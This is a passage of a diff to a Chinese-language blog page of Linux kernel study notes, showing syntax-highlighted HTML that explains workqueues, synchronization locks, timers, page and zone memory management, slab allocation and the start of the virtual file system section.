class="meta-keyword">define</span> WORK_STRUCT_WQ_DATA_MASK (~WORK_STRUCT_FLAG_MASK)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span>         <span class="comment">/* 中断下半部处理函数的链表 */</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;               <span class="comment">/* 处理中断下半部工作的函数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在kernel/workqueue.c文件中定义</span></span><br><span class="line"><span class="comment"> * 每个工作者线程对应一个cpu_workqueue_struct,其中包含要处理的工作的链表</span></span><br><span class="line"><span class="comment"> * (即work_struct的链表,当此链表不空时,唤醒工作者线程来进行处理)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;                   <span class="comment">/* 锁保护这种结构 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">worklist</span>;</span>         <span class="comment">/* 工作队列头节点 */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> more_work;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> *<span class="title">current_work</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> *<span class="title">wq</span>;</span>       <span class="comment">/* 关联工作队列结构 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">thread</span>;</span>        <span class="comment">/* 关联线程 */</span></span><br><span class="line">&#125; ____cacheline_aligned;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 也是在kernel/workqueue.c文件中定义的</span></span><br><span class="line"><span class="comment"> * 每个workqueue_struct表示一种工作者类型,系统默认的就是events工作者类型</span></span><br><span class="line"><span class="comment"> * 每个工作者类型一般对应n个工作者线程,n就是处理器的个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> *<span class="title">cpu_wq</span>;</span>  <span class="comment">/* 工作者线程 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> singlethread;</span><br><span class="line">    <span class="keyword">int</span> freezeable;        <span class="comment">/* Freeze threads during suspend */</span></span><br><span class="line">    <span class="keyword">int</span> rt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
 <h2 id="内核同步"><a href="#内核同步" class="headerlink" title="内核同步"></a>内核同步</h2><p>存在共享资源（共享一个文件，一块内存等等）的时候，为了防止并发访问时共享资源的数据不一致，引入了同步机制</p>
@@ -1454,6 +1568,7 @@
 <ul>
 <li>自旋锁：当一个线程获取了锁之后，其他试图获取这个锁的线程一直在循环等待获取这个锁，直至锁重新可用（由于线程实在一直循环的获取这个锁，所以会造成CPU处理时间的浪费，因此最好将自旋锁用于能很快处理完的临界区）</li>
 <li>互斥锁：互斥锁也是一种可以睡眠的锁，相当于二值信号量，只是提供的API更加简单，使用的场景也更严格一些 </li>
+<li>顺序锁：读锁被获取的情况下，写锁仍然可以被获取</li>
 </ul>
 <p><strong>信号量</strong></p>
 <p>信号量也是一种锁，和自旋锁不同的是，进程获取不到信号量的时候，不会像自旋锁一样循环的去试图获取锁，而是进入睡眠（进入等待队列），直至有信号量释放出来时，才会唤醒睡眠的进程，进入临界区执行</p>
@@ -1482,7 +1597,362 @@
 <li>如果一个任务要执行一些工作时，另一个任务就会在完成变量上等待</li>
 </ul>
 <p><strong>同步方法选择</strong></p>
-<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527.png" class width="1660900515527"> 
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527-1661508831097.png" class width="1660900515527"> 
+<h2 id="系统时间"><a href="#系统时间" class="headerlink" title="系统时间"></a>系统时间</h2><p>系统中管理的时间有2种：实际时间和定时器</p>
+<ul>
+<li>实际时间：现实中钟表上显示的时间，其实内核中并不常用这个时间，主要是用户空间的程序有时需要获取当前时间，所以内核中也管理着这个时间</li>
+<li>定时器：内核中主要使用的时间管理方法，通过定时器，可以有效的调度程序的执行 </li>
+</ul>
+<p><strong>定时器</strong></p>
+<p>定时器在内核中用一个链表来保存的，链表的每个节点都是一个定时器 </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timer_list</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> expires;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> (*function)(<span class="keyword">unsigned</span> <span class="keyword">long</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tvec_base</span> *<span class="title">base</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TIMER_STATS</span></span><br><span class="line">    <span class="keyword">void</span> *start_site;</span><br><span class="line">    <span class="keyword">char</span> start_comm[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">int</span> start_pid;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>定时器的使用中，下面2个概念非常重要：</p>
+<ul>
+<li>HZ：节拍率(HZ)是时钟中断的频率，表示的一秒内时钟中断的次数 </li>
+<li>jiffies：jiffies 用来记录自系统启动以来产生的总节拍数，比如系统启动了 N 秒，那么 jiffies 就为 N×HZ </li>
+</ul>
+<p>一个动态定时器的生命周期中，一般会经过下面的几个步骤： </p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661421650964.png" class width="1661421650964"> 
+<p><strong>时间中断</strong></p>
+<p>时钟中断处理程序作为系统定时器而注册到内核中，体系结构的不同，可能时钟中断处理程序中处理的内容不同，介绍如下：</p>
+<ul>
+<li>时钟中断是一种硬中断，由时间硬件（系统定时器，一种可编程硬件）产生，CPU处理后交由时间中断处理程序来完成更新系统时间、执行周期性任务等</li>
+<li>系结构相关部分被注册到内核中，确保中断产生时能执行，这部分不能有耗时操作，主要是更新时间与调用结构无关部分列程（异步）</li>
+<li>已到期的定时器由体系结构无关部分来处理，其它的一些耗时操作，如显示时间的更新也在这一部分</li>
+</ul>
+<p>但是以下这些基本的工作都会执行：</p>
+<ul>
+<li>获得 xtime_lock 锁（一种顺序锁），以便对访问 jiffies_64 和墙上时间 xtime 进行保护</li>
+<li>需要时应答或重新设置系统时钟</li>
+<li>周期性的使用墙上时间更新实时时钟</li>
+<li>调用 <code>tick_periodic()</code></li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">tick_periodic</span><span class="params">(<span class="keyword">int</span> cpu)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (tick_do_timer_cpu == cpu) &#123;</span><br><span class="line">        write_seqlock(&amp;xtime_lock);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Keep track of the next tick event */</span></span><br><span class="line">        tick_next_period = ktime_add(tick_next_period, tick_period);</span><br><span class="line"></span><br><span class="line">        do_timer(<span class="number">1</span>);</span><br><span class="line">        write_sequnlock(&amp;xtime_lock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    update_process_times(user_mode(get_irq_regs()));</span><br><span class="line">    profile_tick(CPU_PROFILING);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>上述场景中，写锁必须要优先于读锁（因为 <strong>xtime</strong> 必须及时更新），而且写锁的使用者很少（一般只有系统定期更新 <strong>xtime</strong> 的线程需要持有这个锁）</li>
+<li>这正是 [顺序锁] 的应用场景</li>
+</ul>
+<h2 id="内存管理"><a href="#内存管理" class="headerlink" title="内存管理"></a>内存管理</h2><p><strong>页</strong></p>
+<p>内存最基本的管理单元是页，同时按照内存地址的大小，大致分为3个区，页的大小与体系结构有关，在 x86 结构中一般是 4KB 或者 8KB</p>
+<p>可以通过 <code>getconf</code> 命令来查看系统的 page 的大小： </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  桌面 getconf -a | grep -i <span class="string">&#x27;page&#x27;</span></span><br><span class="line">PAGESIZE                           <span class="number">4096</span></span><br><span class="line">PAGE_SIZE                          <span class="number">4096</span></span><br><span class="line">_AVPHYS_PAGES                      <span class="number">514073</span></span><br><span class="line">_PHYS_PAGES                        <span class="number">995803</span></span><br></pre></td></tr></table></figure>
+<p>用于描述页的结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;    <span class="comment">/* 存放页的状态,各种状态参见&lt;linux/page-flags.h&gt; */</span></span><br><span class="line">    <span class="keyword">atomic_t</span> _count;        <span class="comment">/* 页的引用计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span> _mapcount;    <span class="comment">/* 已经映射到mms的pte的个数 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span>        <span class="comment">/* 用于slab层 */</span></span><br><span class="line">            u16 inuse;</span><br><span class="line">            u16 objects;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">private</span>;        <span class="comment">/* 此page作为私有数据时,指向私有数据 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">address_space</span> *<span class="title">mapping</span>;</span>    <span class="comment">/* 此page作为页缓存时,指向关联的address_space */</span></span><br><span class="line">        &#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_SPLIT_PTLOCKS</span></span><br><span class="line">        <span class="keyword">spinlock_t</span> ptl;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">slab</span>;</span>    <span class="comment">/* 指向slab层 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">first_page</span>;</span>    <span class="comment">/* 尾部复合页中的第一个页 */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="keyword">pgoff_t</span> index;        <span class="comment">/* Our offset within mapping */</span></span><br><span class="line">        <span class="keyword">void</span> *freelist;        <span class="comment">/* SLUB: freelist req slab lock */</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lru</span>;</span>    <span class="comment">/* 将页关联起来的链表项 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(WANT_PAGE_VIRTUAL)</span></span><br><span class="line">    <span class="keyword">void</span> *<span class="keyword">virtual</span>;            <span class="comment">/* 页的虚拟地址 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* WANT_PAGE_VIRTUAL */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_WANT_PAGE_DEBUG_FLAGS</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> debug_flags;    <span class="comment">/* Use atomic bitops on this */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KMEMCHECK</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * kmemcheck wants to track the status of each byte in a page; this</span></span><br><span class="line"><span class="comment">     * is a pointer to such a status block. NULL if not tracked</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">void</span> *shadow;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p><strong>区</strong></p>
+<p>页是内存管理的最小单元，但是并不是所有的页对于内核都一样</p>
+<ul>
+<li>内核将内存按地址的顺序分成了不同的区，有的硬件只能访问有专门的区，其实一般主要关注的区只有3个：</li>
+</ul>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>区</strong></th>
+<th><strong>描述</strong></th>
+<th><strong>物理内存</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ZONE_DMA</td>
+<td>DMA使用的页</td>
+<td>&lt; 16MB</td>
+</tr>
+<tr>
+<td>ZONE_NORMAL</td>
+<td>正常可寻址的页</td>
+<td>16MB～896MB</td>
+</tr>
+<tr>
+<td>ZONE_HIGHMEM</td>
+<td>动态映射的页</td>
+<td>&gt; 896MB 某些硬件只能直接访问内存地址，不支持内存映射，对于这些硬件内核会分配 ZONE_DMA 区的内存。</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>某些硬件的内存寻址范围很广，比虚拟寻址范围还要大的多，那么就会用到 ZONE_HIGHMEM 区的内存</li>
+<li>对于 ZONE_HIGHMEM 区的内存，后面还会讨论</li>
+<li>对于大部分的内存申请，只要用 ZONE_NORMAL 区的内存即可，例如以下几种方式就是分配 ZONE_NORMAL 区的内存：</li>
+</ul>
+<p><strong>按页获取内存</strong>：最原始的方法，用于底层获取内存的方式</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th><strong>方法</strong></th>
+<th><strong>描述</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>alloc_page(gfp_mask)</td>
+<td>只分配一页，返回指向页结构的指针</td>
+</tr>
+<tr>
+<td>alloc_pages(gfp_mask, order)</td>
+<td>分配 2^order 个页，返回指向第一页页结构的指针</td>
+</tr>
+<tr>
+<td>__get_free_page(gfp_mask)</td>
+<td>只分配一页，返回指向其逻辑地址的指针</td>
+</tr>
+<tr>
+<td>__get_free_pages(gfp_mask, order)</td>
+<td>分配 2^order 个页，返回指向第一页逻辑地址的指针</td>
+</tr>
+<tr>
+<td>get_zeroed_page(gfp_mask)</td>
+<td>只分配一页，让其内容填充为0，返回指向其逻辑地址的指针</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>按字节获取内存</strong>：使用最多的获取方法</p>
+<p>有两种方式进行该种类型的分配：</p>
+<ul>
+<li>kmalloc：分配的内存物理地址是连续的，虚拟地址也是连续的</li>
+<li>vmalloc：分配的内存物理地址是不连续的，虚拟地址是连续的</li>
+</ul>
+<p>因此在使用中，用的较多的还是 kmalloc：</p>
+<ul>
+<li>kmalloc 的性能较好</li>
+<li>kmalloc 的物理地址和虚拟地址之间的映射比较简单，只需要将物理地址的第一页和虚拟地址第一页关联起来即可</li>
+<li>vmalloc 由于物理地址是不连续的，所以要将物理地址的每一页都和虚拟地址关联起来才行</li>
+</ul>
+<p>PS：其实 kmalloc() 底层也是基于 SLAB 分配器的，只不过它所需要的管理结构头已经按照 2^n 的大小排列事先准备好了而已，这个管理结构体数组是 <code>struct cache_sizes malloc_sizes[]</code></p>
+<p><strong>Slab 层获取</strong>：效率最高的获取方法</p>
+<p>linux 中的高速缓存是用所谓 slab 层来实现的，slab 层即内核中管理高速缓存的机制，整个 slab 层的原理如下：</p>
+<ul>
+<li>可以在内存中建立各种对象的高速缓存（比如进程描述相关的结构 task_struct 的高速缓存）</li>
+<li>除了针对特定对象的高速缓存以外，也有通用对象的高速缓存</li>
+<li>每个高速缓存中包含多个 slab，slab 用于管理缓存的对象</li>
+<li>slab 中包含多个缓存的对象，物理上由一页或多个连续的页组成</li>
+</ul>
+<p>高速缓存 -&gt; slab -&gt; 缓存对象之间的关系如下图：</p>
+<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1661432738679.png" class width="1661432738679"> 
+<p>用于管理 slab 的结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">slab</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>   <span class="comment">/* 存放缓存对象，这个链表有 满，部分满，空 3种状态  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> colouroff; <span class="comment">/* slab 着色的偏移量 */</span></span><br><span class="line">    <span class="keyword">void</span> *s_mem;             <span class="comment">/* 在 slab 中的第一个对象 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;         <span class="comment">/* slab 中已分配的对象数 */</span></span><br><span class="line">    <span class="keyword">kmem_bufctl_t</span> <span class="built_in">free</span>;      <span class="comment">/* 第一个空闲对象(如果有的话) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> nodeid;   <span class="comment">/* 应该是在 NUMA 环境下使用 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>slab 层的应用主要有四个方法：</p>
+<ul>
+<li>高速缓存的创建</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">size_t</span> size, <span class="keyword">size_t</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * 创建成功时,返回指向高速缓存指针(kmem_cache *cachep)</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>从高速缓存中分配对象</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">kmem_cache_alloc</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">gfp_t</span> flags)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @flags  - 之前讨论的 gfp_mask 标志,只有在高速缓存中所有slab都没有空闲对象</span></span></span><br><span class="line"><span class="comment"><span class="function"> *           并且需要申请新的空间时,这个标志才会起作用</span></span></span><br><span class="line"><span class="comment"><span class="function"> *</span></span></span><br><span class="line"><span class="comment"><span class="function"> * 分配成功时,返回指向对象的指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>向高速缓存释放对象</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_free</span><span class="params">(struct kmem_cache *cachep, <span class="keyword">void</span> *objp)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @objp   - 要释放的对象的指针</span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>高速缓存的销毁</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">kmem_cache_destroy</span><span class="params">(struct kmem_cache *cachep)</span></span></span><br><span class="line"><span class="function"><span class="comment">/*</span></span></span><br><span class="line"><span class="comment"><span class="function"> * @cachep - 指向高速缓存指针 </span></span></span><br><span class="line"><span class="comment"><span class="function"> */</span></span></span><br></pre></td></tr></table></figure>
+<p><strong>高端内存获取</strong></p>
+<p>高端内存就是之前提到的 ZONE_HIGHMEM 区的内存</p>
+<p>在x86体系结构中，这个区的内存不能映射到内核地址空间上，也就是 <strong>没有逻辑地址</strong>，为了使用 ZONE_HIGHMEM 区的内存，内核提供了永久映射和临时映射2种手段：</p>
+<ul>
+<li>永久映射：永久映射的函数是可以睡眠的，所以只能用在进程上下文中 </li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 将 ZONE_HIGHMEM 区的一个page永久的映射到内核地址空间</span></span><br><span class="line"><span class="comment"> * 返回值即为这个page对应的逻辑地址 */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap</span><span class="params">(struct page *page)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 允许永久映射的数量是有限的，所以不需要高端内存时，应该及时的解除映射 */</span></span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">kunmap</span><span class="params">(struct page *page)</span></span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>临时映射：临时映射不会阻塞，也禁止了内核抢占，所以可以用在中断上下文和其他不能重新调度的地方</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 将 ZONE_HIGHMEM 区的一个page临时映射到内核地址空间</span></span><br><span class="line"><span class="comment"> * 其中的 km_type 表示映射的目的</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">kmap_atomic</span><span class="params">(struct page *page, <span class="keyword">enum</span> km_type idx)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="comment">/* 相应的解除映射是个宏 */</span></span></span><br><span class="line"><span class="function"><span class="meta">#<span class="meta-keyword">define</span> kunmap_atomic(addr, idx)    do &#123; pagefault_enable(); &#125; while (0)</span></span></span><br></pre></td></tr></table></figure>
+<h2 id="虚拟文件系统"><a href="#虚拟文件系统" class="headerlink" title="虚拟文件系统"></a>虚拟文件系统</h2><p>虚拟文件系统（VFS）是 linux 内核和具体 I/O 设备之间的封装的一层共通访问接口，通过这层接口，linux 内核可以以同一的方式访问各种 I/O 设备，主要有以下好处：</p>
+<ul>
+<li>简化了应用程序的开发：应用通过统一的系统调用访问各种存储介质</li>
+<li>简化了新文件系统加入内核的过程：新文件系统只要实现VFS的各个接口即可，不需要修改内核部分</li>
+</ul>
+<p>虚拟文件系统本身是 linux 内核的一部分，是纯软件的东西，并不需要任何硬件的支持，其核心就是4个主要对象，具体每个对象的含义参见如下的详细介绍</p>
+<p><strong>超级块</strong></p>
+<p>超级块（super_block）主要存储文件系统相关的信息，这是个针对文件系统级别的概念</p>
+<p>它一般存储在磁盘的特定扇区中，但是对于那些基于内存的文件系统（比如 proc，sysfs），超级块是在使用时创建在内存中的</p>
+<p>描述超级块的结构体如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * 超级块结构中定义的字段非常多</span></span><br><span class="line"><span class="comment"> * 这里只介绍一些重要的属性</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">super_block</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">s_list</span>;</span>               <span class="comment">/* 指向所有超级块的链表 */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">super_operations</span>    *<span class="title">s_op</span>;</span> <span class="comment">/* 超级块方法 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">dentry</span>        *<span class="title">s_root</span>;</span>           <span class="comment">/* 目录挂载点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>        <span 